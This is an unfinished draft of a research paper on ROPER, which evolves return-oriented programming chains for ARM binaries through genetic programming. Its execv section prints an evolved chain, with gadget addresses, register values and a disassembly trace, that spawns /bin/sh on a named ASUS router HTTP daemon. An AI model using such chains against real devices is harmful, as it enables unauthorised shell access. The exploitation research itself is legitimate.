%
\section{Introduction}

\textsc{Roper} is a genetic compiler that evolves payloads for
return-oriented programming (\textsc{rop}) attacks. These are
attacks that manipulate their host's control flow in subtle and
fine-grained ways, and, unlike traditional shellcode attacks,
they do this without at any point introducing foreign code,
or writing to executable memory. Since it is becoming
increasingly rare for processes to map \emph{any} segment of
memory as both writeable and executable -- due to a defensive
measure called `Data Execution Prevention' (\textsc{dep}) when
implemented on Windows, or `Write xor Execute'
%% mention also harvard bus architectures, etc. 
($W \oplus X$), when implemented in a Unix environment --
return-oriented programming (or \textsc{rop}) has become the
industry standard approach to payloads in binary exploit
development. 

ROP works by sifting through the host process's executable memory
-- its \texttt{.text} segment, if we're dealing with
\textsc{elf} binaries -- and finding chunks of code that can be
rearranged in such a way that they carry out the attacker's
wishes, rather than their intended design. For these chunks to be
usable in an attack, however, it must be possible to jump from
one to the other in a predetermined sequence. This is where the
`return-oriented' nature of the attack comes in: most
architectures implement subroutine or function calls by first
pushing the address of the instruction \emph{after} the call to
the stack, and then jumping to the first instruction of a
subroutine that, itself, ends by popping the bookmarked `return
address' from the stack. In a \textsc{rop} attack, we exploit
this manner of implementing returns. We set things up so that
the `return address' popped from the stack at the end of each
`gadget' is just a pointer to the next gadget we wish to execute.
This lets us chain together indefinitely many \textsc{rop}
gadgets in sequence, and it is, in principle, possible to
implement complex attacks in this fashion, without ever needing
to use any executable code that isn't already there, waiting for
us in the process's executable memory segment.%
\footnote{\textbf{Cite that research paper that describes an
  entire rootkit written in rop chains}}

These chains are the kind of entities that our engine evolves. The
genetic material consists of the set of gadgets extracted from
a target executable binary -- we focus for now on \textsc{elf}
binaries compiled for 32-bit \textsc{arm} processors. The
individual genotypes are \textsc{rop}-chains, formed from this
material. The phenotype, on which selection pressures are brought
to bear, is the behaviour these genotypes exhibit when executed
in a virtual (but realistic) \textsc{cpu}. The entire set up
resembles a variation on linear genetic programming, but with a
few key differences, required by the nature of the problem at
hand. The goal is to not simply automate the somewhat tricky and
time-consuming human task of assembling \textsc{rop}-chain
payloads -- though \textsc{roper} does that quite well -- but to
explore an entirely novel class of payloads: \textsc{rop}-chains
that exhibit the sort of subtle and adaptive behaviour for which
we normally turn to machine learning. 

As a proof of concept, here, I will show how we succeeded in
evolving \textsc{rop}-chain payloads that cannibalize arbitrary
binaries into mosaics capable of solving a few traditional
benchmark classification problems with high degrees of accuracy,
beginning with the famous Iris dataset. Without injecting a
single foreign instruction, we will coax system and backend
binaries into tasks that resemble nothing they were designed to
do, and nothing that has previously been attempted in low-level
binary exploitation: we'll have them sort flowers.
\section{Background}

\subsection{Return-Oriented Programming}

%\subsection{Linear Genetic Programming}
% maybe move that other bit up here
\subsection{Prior Research and Development}

% Stephanie Forrest
% Bill Langdon (sp?) (UK)

\subsubsection{ROP-Chain Compilers}

A handful of technologies have already been developed for the
automatic generation of \textsc{rop}-chains. These range from
tools that use one of several determinate recipes for assembling
a chain -- such as the {Corelan Team}'s extraordinarily useful
\texttt{mona.py} -- to tools which approach the problem through
the lens of compiler design, grasping the set of gadgets
extracted from a binary as the instruction set of a baroque and
supervenient virtual machine. %% Maybe add a quote or two. 

We're aware of two such projects at the moment. The first, named
\emph{Q}, is described in [CITE]. 
%%% figure out citation standards for this. 

The second, \textsc{ropc}, grew out of its authors' attempts to
reverse engineer $Q$ from its desrciption in [CITE], and extend
its capabilities to the point where it could compile
\textsc{rop}-chains for scripts written in a Turing-complete
programming language. 

The project has since inspired a fork that aims to use
\textsc{ropc}'s own intermediate language as an \textsc{llvm}
backend, which, if successful, would let programmes written in
any language that compiles to \textsc{llvm}'s intermediate
language, compile to \textsc{ropc}-generated \textsc{rop}-chains
as well.  

Another, particularly interesting contribution in the field of
automated ROP-chain generation is \emph{Braille}, by Andrea
Bittau \emph{et al.}%
\footnote{CITE THIS}
which automates an attack that its developers term "Blind
Return-Oriented Programming", or \textsc{brop}. \textsc{brop}
solves the problem of developing \textsc{rop}-chain attacks
against processes where not only the source code but the binary
itself in unknown. %% Perhaps add more details
\emph{Braille} first uses a stack-reading technique to probe a
vulnerable process (one that is subject to a buffer overflow and
which automatically restarts after crashing), to find enough
gadgets, through trial and error, for a simple \textsc{rop} chain
whose purpose will be to write the process's executable memory
segment to a socket, sending that segment's data back to the
attacker -- data that is then used, in conjunction with address
information obtained through stack-reading, to construct a
more elaborate \textsc{rop}-chain the old-fashioned way. It is an
extremely interesting and clever technique, which could, perhaps,
be fruitfully combined with the genetic techniques we will
outline here. 

\subsubsection{Evolutionary Computation in Offensive Security}
% kayacik
% that defcon presentation
% maybe port scanning?
\paragraph{Prior research at NIMS Laboratory}
This is not the first exploration that our lab
has made in applying evolutionary computation to the domain of
offensive cybersecurity. Gunes Kayacik ...

Patrick LaRoche [port scans]...

\paragraph{Other applications}
Other applications of evolutionary methods in offensive security:
lcamtuf AFL

\section{Methodology}

\subsection{Genotype Representation}

 
\subsubsection{Gadgets, Clumps, and Chains}

Individuals, here, are essentially vectors of 32-bit words, which
may be either pointers into executable memory addresses, intended
to be popped into the program counter, or other values, intended
to be popped into the \textsc{cpu}'s other registers. 

Returns, in ARM machine code, are frequently implemented as
multi-pop instructions -- which pop an address from the stack
while simultaneously popping a variable number of additional
words into the other registers. Depending on the problem we're
dealing with, the range of values that could potentially be
made use of in the general purpose registers might be very
different from the range of values where we find pointers into
executable memory, so it makes sense to interleaf address
pointers and other values in a controlled fashion, when
constructing our initial population. 
% also other pops

To do this, we calculate the distance the stack pointer will shift
when each gadget executes, $\Delta_{SP}(g)$, and then clump
together each gadget pointer $g$ with a vector of
$\Delta_{SP}(g)-1$ non-gadget values.%
\footnote{The pop instruction, \texttt{LDMIA! sp, \{r0, r7, 
  r9, pc\}},
  for example, has an $\Delta_{SP}$ of 4. If it's the only
  instruction that moves the stack pointer in gadget $g$, then
  $\Delta_{SP}(g) = 4$, and we will append 3 words to the clump
  that begins with a pointer to $g$.}
These values will populate
the \textsc{cpu}'s registers when the final, multipop instruction of the
gadget is executed. The program counter (\texttt{PC}) is always
the final register populated through a multipop, and so the
address of the next gadget $g'$ should be found exactly
$\Delta_{SP}(g)$ slots up from $g$.%
\footnote{\textsc{rop}ER also handles gadgets that end in a different
  form of return: a pair of instructions that populates a series
  of registers from the stack, followed by an instruction that
  copies that address from one of those registers to \texttt{PC}.
  In these instances, $\Delta{SP}(g)$ and the offset of the next
  gadget from $g$ are distinct. But this is a complication that
  we don't need to dwell on here.}

\subsubsection{Variation Operators}
\paragraph{Mutation}
Structuring the basic units of our genotypes in this way also
lets us apply variation operators more intelligently. The
genotype is much more tolerant of mutations to the non-gadget
values in each clump than to the gadget address itself. The
gadget address \emph{may} be safe to increment or decrement by a
word or two, but negating, multiplying, or masking it would
almost certainly result in a crash. The rest of the words in the
clump can be mutated much more freely, either arithmetically, or
by indirection/dereference (we can replace a value with a pointer
to that value, if one is available, or if a value can already be
read as a valid pointer, we can replace it with its referent).

\paragraph{Crossover}
Our second variation operator is single-point crossover, which
operates at the level of `clumps', not words. We chose
single-point crossover over two-point or uniform crossover
% check terminology
to favour the most likely form gene linkage would take in this
context. A single \textsc{rop}-gadget can transform the \textsc{cpu} context in
fairly complex ways, and, combined with multipop instructions,
the odds that the work performed by a gadget $g$ will be
clobbered by a subsequent gadget $g'$ increases greatly with the
distance of $g'$ from $g$. This means that adjacent gadgets are
more likely to achieve a combined, fitness-relevant effect, than
non-adjacent gadgets. 

In single-point crossover between two specimens, $A$ and $B$, we
randomly select a link index $i$ where $i < |A|$, and $j$ where $j
< |B|$. We then form one child whose first $i$ genes are taken
from the the beginning of $A$, and whose next $j$ genes are taken
from the end of $B$, and another child using the complimentary
choice of genes. 
%% Diagram would be handy here

\subsubsection{Viscosity and Gene Linkage}
As a way of encouraging the formation of complex `building
blocks' -- sequences of clumps that tend to improve fitness when
occurring together in a chain -- we weight the random choice of
the crossover points $i$ and $j$, instead of letting them be
simply uniform. The weight, or \emph{viscosity}, of each
link in chain $A$ is derived from the running average of fitness
scores of unbroken series of ancestors of $A$ in which that same link
has occurred. Following a fitness evaluation of $A$, the
link-fitness of each clump $f(A[i])$ (implicitly, between each
clump and its successor) is calculated on the basis of the
fitness of $A$, $F(A)$, as follows: 
  $$ f(A[i]) = F(A)$$
if the prior link fitness $f'(A[i])$ of $A[i]$ is \texttt{None},
and 
  $$ f(A[i]) = \alpha * F(A) + (1-\alpha) * f'(A[i]) $$
otherwise. The prior link-fitness value $f'(A[i])$ is inherited
from the parent from which the child child receives the link in
question. If the child $A$ receives its $i^{th}$ clump from one
parent and its $(i+1)^{th}$ clump from another, or if $i$ is the
final clump in the chain, then $f'(A[i])$ is initialized to
\texttt{None}.

Viscosity is calculated from link-fitness simply by substituting
a default value ($50\,\%$) for \texttt{None}, or taking the
complement of the link-fitness. This value is the probability at
which a link $i..i+1$ will be selected as the splice point in a
crossover event. 

In the event of a crash, the link-fitness of the clump
responsible for the crash-event is severely worsened
and the viscosity adjusted accordingly. The crossover algorithm
is set up in such a way that crash-provoking clumps have a
disproportionately high chance of being selected as
splice-points, and are likely to simply be dropped from the gene
pool, and elided in the splice. This has the effect of weeding
particularly hazardous genes out of the genepool fairly quickly,
as we will see. 

%\subsubsection{Variation on Linear GP}

%In many respects, the approach that \textsc{roper} takes is a
%variation on linear \textsc{gp}\@. Corresponding to
%\emph{instructions}, here, we have \emph{gadgets}, which form the
%instruction set of a second-order virtual machine, supervening on
%the virtual \textsc{arm cpu} where the chains will be evaluated.
%Like register-based linear \textsc{gp}, the execution of a chain
%should be understood as imperative and stateful. The
%`instructions' they make up are not strictly functional, unless
%we view the entire \textsc{cpu} context as its argument, and the
%resulting register vector as its return value.% 
%\footnote{The clump-structure that we use here, incidentally,
%  means that each gadget gets its stack arguments from the clump
%  that precedes it.}
% Is this a good thing? Should I structure clumps the other way
% around?  well, the thing is, we wouldn't know how many items to
% prepend a given gadget with. inverting the clump structure
% would be rather complicated. 




\subsection{Phenotype Evaluation}
The phenotype, here, is the \textsc{cpu} context resulting from the execution of the genotype (the \textsc{rop}-chain) in a virtual machine, passed through one of a handful of `fitness functions'. Let's look at these factors one at a time. 
\subsubsection{Execution Environment}
% unicorn vm
The transformation of the genotype into its corresponding
phenotype -- its `ontogenesis' -- takes place in one of a cluster
of virtual machines set up for this purpose, using Nguyen Anh
Quynh's superb Unicorn Engine emulation library. A cluster of
emulator instances is initialized at the beginning of each run,
and the binary that we wish to exploit is loaded into its memory.
We enforce non-writeability for the process's entire memory, with
the sole exception of the stack, where we will be writing our
\textsc{rop}-chains. There are two reasons for this: first, since
the task is to evolve pure \textsc{rop}-chain payloads, we might
as well enforce $W \oplus X$ as rigorously as possible -- the
very defensive measure that \textsc{rop} was invented to subvert.
Second, it makes things far more reliable and efficient if we
don't have to worry about any of our chains corrupting their
shared execution environment by, say, overwriting instructions in
executable memory. This lets us treat each chain as strictly
functional: the environment being stable, the output of a chain
is uniquely determined by its composition and its inputs.%
\footnote{Neglecting to enforce this in early experiments led to
  interesting circumstances where a chain would score remarkably
  well on a given run, but under conditions that were nearly
  impossible to reconstruct or repeat, since its success had
  depended on some ephemeral corruption of its environment.}

In order to map the genotype -- a stack of pointers into the executable memory (typically the \texttt{.text} segment) of the host process -- into its resulting \textsc{cpu} context, the following steps are taken:

\begin{enumerate} 
  \item serialize the individual's clumps into a sequence of bytes
  \item copy this sequence over to the process's stack, followed by a long sequence of zeroes
  \item pop the first word on the stack into the program counter register (\texttt{R15} or \texttt{PC} on ARM)
  \item activate the machine
  \item execution stops when the program counter hits zero -- as will happen when it exhausts the addresses we wrote to its stack, when execution crashes, or when a predetermined number of steps have elapsed
  \item we then read the values in the VM's register vector, and pass this vector to one of our fitness functions
\end{enumerate}

The reason a \textsc{rop}-chain controls the execution path,
remember, is that each of the snippets of code (`gadgets') that
its pointers refer to ends with a return instruction, which pops
an address into the program counter from the stack. In ordinary,
non-pathological cases, this address points to the instruction in
the code that comes immediately after a function call -- it's a
bookmark that lets the \textsc{cpu} pick up where it left off,
after returning from a function. The cases we're interested in --
and engineering -- of course, \emph{are} pathological: here, the
address that the return instruction pops from the stack doesn't
point to the place the function was called from, but to the next
gadget that we want the machine to execute. This gadget, in turn,
will end by popping the stack into the program counter, and so
on, until the stack is exhausted, and a zero is popped into
\texttt{PC}. So long as a specimen controls the stack, it's able
to maintain control of the program counter. 


All that's necessary to initiate the process, therefore, is to
pop the first address in the chain into the program counter --
the resulting cascade of returns will handle the rest. In the
wild, this fatal first step is usually accomplished by means of
some form of memory corruption -- using a buffer overflow or,
more common nowadays, a use-after-free vulnerability, to
overwrite a saved return address or a vtable pointer,
respectively.  The attacker leverages one of these
vulnerabilities in order to write the first pointer in the chain
to an address that will be unwittingly `returned to' or `called'
by the process. In our set-up, this step is merely simulated. The
rest, however, unfolds precisely as it would in an actual
attack.

%% Some of this stuff on how \textsc{rop} chains work might be better to
%% have in the BACKGROUND section. Then again, a bit of
%% repetition never hurt anybody. 
\subsubsection{Fitness Functions}

Two different fitness functions have been studied, so far, with
this setup. 

\paragraph{Pattern matching.} The first, and more immediately
utilitarian, of the two is simply to converge on a precisely
specified \textsc{cpu} context. A pattern consisting of 32-bit
integers and wildcards is supplied to the engine, and the task is
to evolve a \textsc{rop}-chain that brings the register vector to
a state that matches the pattern in question. The fitness of a
chain's phenotype is defined as the average between
\begin{enumerate}
  
  \item the hamming distance between the non-wildcard target
    registers in the pattern, and the actual register values
    resulting from the chain's execution, and
  
  \item the arithmetical difference between the non-wildcard
    target registers and the resulting register values,

\end{enumerate} 
divided by 
\begin{enumerate}
    \setcounter{enumi}{2}
  \item the number of matching values between the resulting
and target register vectors, irrespective of place.
\end{enumerate}
The reason
for combining these three different metrics is that there is a
wide variety of operations that can be carried out by our chains,
and so we would like our concept of difference to reflect,
however vaguely, the number of steps that might be needed to
reach our target, whether through numerical, bitwise, or move
operations.

This is a fairly simple task, but one that has immediate
application in \textsc{rop}-chain development, where the goal is
often simply to set up the desired parameters for a system call
-- an \texttt{execve} call to open a shell, for example. Such
rudimentary chains can be easily generated by \textsc{roper}. 
In this capacity, \textsc{roper} can be seen as an automation
tool, accomplishing with greater ease and speed what a might take
a human programmer a few hours to accomplish, unaided. 

\paragraph{Classification.} But \textsc{roper} is capable of
more complex and subtle tasks than this, and these set it at some
distance from deterministic \textsc{rop}-chain compilers like
$Q$. As an initial foray in this direction, we set \textsc{roper}
the task of attempting some standard, benchmark classification
problems, commonly used in machine learning, beginning with some
well-known, balanced datasets. In this context, \textsc{roper}'s
task is to evolve a \textsc{rop}-chain that correctly classifies
a given specimen when its $n$ attributes, normalized as integers,
are loaded into $n$ of the virtual \textsc{cpu}'s registers
(which we will term the `input registers') prior to launching the
chain. $m$ separate registers are specified as `output
registers', where $m$ is the number of classes that
\textsc{roper} must decide between. Whichever output register
contains the greatest signed value after the attack has run its
course is interpreted as the classification of the specimen in
question. 

The basis of the fitness function used for these tasks
is just the detection rate. %% use something more sophisticated?
We will look at the results of these classification experiments
in the next section. 

\paragraph{Crash rate.} Our population of random
\textsc{rop}-chains begins its life as an extraordinarily noisy
and error-prone species, and so it is fairly common, at the
beginning of a run, that a chain will not have all of its gadgets
executed before crashing, for one reason or another. Crashing,
for both tasks (pattern matching and classification),
carries with it a penalty to fitness that is relative to the
proportion of gadgets in the chain whose return instructions have
not been reached. (This is measured by placing soft breakpoints at
each gadget's return instruction, and incrementing a counter when
each return is executed.) By not simply disqualifying chains that
crash, or prohibiting instructions that are highly likely to
result in a crash, we provide our population with a much richer
array of materials to work with, and, in certain circumstances,
dictated by competition with other chains, room to experiment
with riskier tactics when it comes to control flow. At the same
time, the moderate selective pressure that pushes \emph{against}
crashes is typically enough to steer the population towards
more stable solutions. 

\subsection{Selection scheme}

The selection method used in these experiments is a fairly simple
tournament scheme: \texttt{t\_size} specimens are selected randomly from a
subpopulation or \emph{deme} and evaluated. The
$\texttt{t\_size}-2$ worst
performers are culled, and the two best become the parents of
\texttt{brood\_size} offspring, via single-point crossover. This
brood is evaluated on a small random sample of the training data,
and the best $\texttt{t\_size} - 2$ children are kept, replacing
their fallen counterparts. 

With each random choice of tournament contestants, there is some
probability, \texttt{migration\_rate}, that contestants may be
drawn from the entire population, rather than just the active
deme. This is to allow genetic material to flow from one
subpopulation to another at a controlled rate. The hope is to
inject diversity from one deme into another, without simply
homogenizing the entire population. 

Hoping to preserve diversity, we've kept \texttt{brood\_size}
relatively low. Crossover tends to be fairly destructive, and so
applying overly harsh selective pressures to the brood has a
tendency to filter out offspring that have lesser resemblance to
their parents (whose fitness, at least with respect to the
contestants chosen for the tournament) has already been
established. 

There is also a certain probability, in each tournament, that
only $\texttt{t\_size} - 1$ contestants will be chosen, and that
instead of being the second-best performer in the tournament, the
second parent will be a new chain, randomly generated from
scratch. This provides a constant trickle of fresh blood into the
gene pool, and helps stave off stagnation.

%The first of these is the classification of the well-known Iris dataset, and in the next section we'll look at how \textsc{roper} performed there.  

% you should at least have a second

\section{Empirical Study}

% binaries
% datasets
% results for pattern matching -- chose realistic examples, such
% as you'd use to prime the registers for a system call
Though our experimental study (and consequent fine-tuning) of
\textsc{roper}'s capabilities is still at an early stage, the
results we have been able to obtain so far have been encouraging. 

\subsection{Pattern Matching for \texttt{execv()}}

A simple and practical example of \textsc{roper}'s
pattern-matching capability is to have it construct the sort of
\textsc{rop} chain we would use if we wanted to, say, pop open a
shell with the host process' privileges. The usual way of
doing this is to write a chain that sets up the system call
$$\texttt{execv("/bin/sh", ["/bin/sh"], 0)}$$
For this to work, we'll need \texttt{r0} and \texttt{r1} to point to
\texttt{"/bin/sh"}, \texttt{r2} to contain $0$, and
\texttt{r7} to contain $11$, the number of the \texttt{execv}
system call. Once all of that is in place, we just jump to any
\texttt{svc} instruction we like, and we have our shell.

First, of course, we need to pick our mark. We'll use a small
\textsc{http} server from an  \textsc{arm} router from \textsc{asus},
\texttt{tomato-RT-N18U- httpd}.%
\footnote{Available at
\texttt{https://advancedtomato.com/downloads/router/rt-n18u}.}
Poking around a little with
Radare 2, we see that this binary already has the string
\texttt{"/bin/sh"} sitting in plain sight, in \texttt{.rodata},
at the address \texttt{0x0002bc3e}. The pattern we want to pass to
\textsc{roper} is
$$\texttt{02bc3e 02bc3e 0 \_ \_ \_ \_ 0b}$$

\textsc{roper} is able to evolve a chain that brings about this
exact register state within a couple of minutes or so, on
average. Below is one such result: a
$31^{\textrm{st}}$-generation descendent of our initial
population of 2048 chains, with a 45\,\% mutation rate, spread over
4 demes with 10\,\% migration trafficking between them. Address
pointers are listed in the left-hand margin, with immediate
values extending to the right. 

{\small
\begin{verbatim}
Clumps:
000100fc 0002bc3e 0002bc3e 0002bc3e 
00012780 0000000b 0000000b 0000000b 0000000b 0002bc3e 
00016884 0002bc3e 
00012780 0002bc3e 0002bc3e 0002bc3e 0002bc3e 0000000b 
000155ec 00000000 0000000b 0002bc3e 
000100fc 0002bc3e 0000000b 00000000 
0000b49c 0002bc3e 0000000b 0002bc3e 0000000b 0002bc3e 
0000b48c 0002bc3e 00000000 0002bc3e 0002bc3e 0002bc3e 
0000b48c 0002bc3e 0002bc3e 0002bc3e 0002bc3e 00000000 
00016918 0002bc3e 0000000b 0002bc3e 0002bc3e 0000000b 
00015d24 0002bc3e 00000000 00000000 
00012a78 0000000b 00000000 
0000e0f8 00000000 
000109b4 0002bc3e 0000000b 
0000b48c 0002bc3e 0002bc3e 0002bc3e 0000000b 0002bc3e 
000100fc 0002bc3e 00000000 00000000 
000109b4 0002bc3e 0002bc3e 
00016758 0000000b 
0000e0f8 0002bc3e 
000100fc 0002bc3e 00000000 0000000b 
00012a78 0002bc3e 0002bc3e 
0001569c 0000000b 0002bc3e 0002bc3e 
0000bfc4 0002bc3e 0002bc3e 
00013760 0000000b 0002bc3e 0000000b 0002bc3e 0000000b 
0000bfc4 0002bc3e 0002bc3e 
0000b49c 0000000b 00000000 0000000b 0000000b 0002bc3e 
00016884 0002bc3e 
00012a78 00000000 0000000b 
00011fd8 0000000b 
00016758 0002bc3e 
0000e0f8 0002bc3e 
00013760 00000000 0000000b 0002bc3e 0002bc3e 0002bc3e 
\end{verbatim}
}

What's interesting about this chain is how labrynthine and
obfuscated it is. In fact, of the 32 gadgets included in the
payload, only the first three execute as expected -- but the
third gadget starts writing to its own call stack, jumping
backwards with a \texttt{bl} instruction, which loads the link
register, pushes it onto the stack, which it will later pop into
the programme counter. From that point forward, we're off-script.
The next four `gadgets' (Deep Gadget 0 through 3) appear to have
been discovered spontaneously. The chain nevertheless concludes
without crashing, ending with a branch to the pre-established
halting address (\texttt{blx r2}, which happens to contain
\texttt{0x00000000}).  Below we have a live disassembly of the
chain as it wound its way through the \textsc{http} daemon's
memory. After each gadget we've printed out the state of the four
registers we're interested in.

{\small
\begin{verbatim}
;; Gadget 0 
[000100fc]  mov r0, r6
[00010100]  ldrb r4, [r6], #1
[00010104]  cmp r4, #0
[00010108]  bne #4294967224
[0001010c]  rsb r5, r5, r0
[00010110]  cmp r5, #0x40
[00010114]  movgt r0, #0
[00010118]  movle r0, #1
[0001011c]  pop {r4, r5, r6, pc}

R0: 00000001
R1: 00000001
R2: 00000001
R7: 0002bc3e

;; Gadget 1
[00012780]  bne #0x18
[00012798]  mvn r7, #0
[0001279c]  mov r0, r7
[000127a0]  pop {r3, r4, r5, r6, r7, pc}

R0: ffffffff
R1: 00000001
R2: 00000001
R7: ffffffff

;; Gadget 2
[00016884]  beq #0x1c
[00016888]  ldr r0, [r4, #0x1c]
[0001688c]  bl #4294967280
[0001687c]  push {r4, lr}
[00016880]  subs r4, r0, #0
[00016884]  beq #0x1c
[000168a0]  mov r0, r1
[000168a4]  pop {r4, pc}

R0: 00000001
R1: 00000001
R2: 00000001
R7: 0002bc3e

;; Deep Gadget 0
[00016890]  str r0, [r4, #0x1c]
[00016894]  mov r0, r4
[00016898]  pop {r4, lr}
[0001689c]  b #4294966744
[00016674]  push {r4, lr}
[00016678]  mov r4, r0
[0001667c]  ldr r0, [r0, #0x18]
[00016680]  ldr r3, [r4, #0x1c]
[00016684]  cmp r0, #0
[00016688]  ldrne r1, [r0, #0x20]
[0001668c]  moveq r1, r0
[00016690]  cmp r3, #0
[00016694]  ldrne r2, [r3, #0x20]
[00016698]  moveq r2, r3
[0001669c]  rsb r2, r2, r1
[000166a0]  cmn r2, #1
[000166a4]  bge #0x48
[000166ec]  cmp r2, #1
[000166f0]  ble #0x44
[00016734]  mov r2, #0
[00016738]  cmp r0, r2
[0001673c]  str r2, [r4, #0x20]
[00016740]  beq #0x10
[00016750]  cmp r3, #0
[00016754]  beq #0x14
[00016758]  ldr r3, [r3, #0x20]
[0001675c]  ldr r2, [r4, #0x20]
[00016760]  cmp r3, r2
[00016764]  strgt r3, [r4, #0x20]
[00016768]  ldr r3, [r4, #0x20]
[0001676c]  mov r0, r4
[00016770]  add r3, r3, #1
[00016774]  str r3, [r4, #0x20]
[00016778]  pop {r4, pc}

R0: 0000000b
R1: 00000000
R2: 00000000
R7: 0002bc3e

;; Deep Gadget 1
[00012780]  bne #0x18
[00012784]  add r5, r5, r7
[00012788]  rsb r4, r7, r4
[0001278c]  cmp r4, #0
[00012790]  bgt #4294967240
[00012794]  b #8
[0001279c]  mov r0, r7
[000127a0]  pop {r3, r4, r5, r6, r7, pc}

R0: 0002bc3e
R1: 00000000
R2: 00000000
R7: 0000000b

;; Deep Gadget 2
[000155ec]  b #0x1c
[00015608]  add sp, sp, #0x58
[0001560c]  pop {r4, r5, r6, pc}

R0: 0002bc3e
R1: 00000000
R2: 00000000
R7: 0000000b

;; Deep Gadget 3
[00016918]  mov r1, r5   <- completes the pattern
[0001691c]  mov r2, r6
[00016920]  bl #4294967176
[000168a8]  push {r4, r5, r6, r7, r8, lr}
[000168ac]  subs r4, r0, #0
[000168b0]  mov r5, r1
[000168b4]  mov r6, r2
[000168b8]  beq #0x7c
[000168bc]  mov r0, r1
[000168c0]  mov r1, r4
[000168c4]  blx r2

R0: 0002bc3e
R1: 0002bc3e
R2: 00000000
R7: 0000000b

\end{verbatim}
}

It seems unlikely that \textsc{roper} would be able to discover
these labyrinthine passageways through its host's memory if the
selection pressure against errors was more severe.
As we can see in figure~\ref{shellpattern-graph}, about halfway
back along the champion's phylogenic tree, the percentage of
crashes in the population peaked to levels unseen since the
beginnings of the run. This is an extremely common phenomenon in
\textsc{roper} evolutions, and tends to occur once fitness has
plateaued for some time. Length begins to increase as protective
code bloat and a preponderance of introns is selected for over
dramatic improvements in fitness, since it decreases the odds
that valuable gene linkages will be destroyed by crossover.%
\footnote{The analysis of code bloat and introns that we're
  drawing on here is largely indebted to the theory of introns that
  Banzhaf et al.\ develop at length in \emph{Genetic Programming: An
  Introduction}, Chapter 7, and \S{7.7} in particular. [PROPER
  CITATION NEEDED]}
We see this clearly enough in our champion \textsc{rop}-chain,
where 29 of its 32 gadgets do not contribute in any way to the
chain's fitness -- though they do increase the odds that its
fitness-critical gene linkages will be passed on to its
offspring. 
\begin{figure}
  \includegraphics[width=\columnwidth]{examples/shellpattern/shellpattern.png}
  \caption{Evolving a shell-spawning chain on {tomato-RT-N18U-httpd}}
  \label{shellpattern-graph}
\end{figure}

Branching to gadgets unlisted in the chain's own genome can be
seen as a dangerous and error-prone tactic to dramatically
increase the proportion of introns in the genome. Selection for
such tactics would certainly explain the tendency for the crash
rate of the population to rise -- and to rise, typically, a few
generations before the population produces a new champion. 

There has been an observable tendency, in fact, for
\textsc{roper} populations' best performers to be those that take
strange and enigmatic risks with their own control flow --
manipulating the programme counter and stack pointer directly,
pushing values to their own call stack, branching wildly into
unexplored regions of memory space, and so on. These are traits
that we rarely see in mediocre specimens, but which are common in
chains that are either complete disasters, or which are the
population's fittest specimens. 

Such traits are even more common when we turn to a more complex
and nuanced problem set, and charge \textsc{roper} with the task
of evolving \textsc{rop}-chain classifiers -- exploits that
exhibit subtle, adaptive behaviour. 

\subsection{Classification of the Iris dataset}
%% start generating graphs for these. have the graph script also
% output latex, please. 

\section{Conclusions}



\begin{acks}
  [Acknowledgement of Raytheon funding goes here.]


\end{acks}
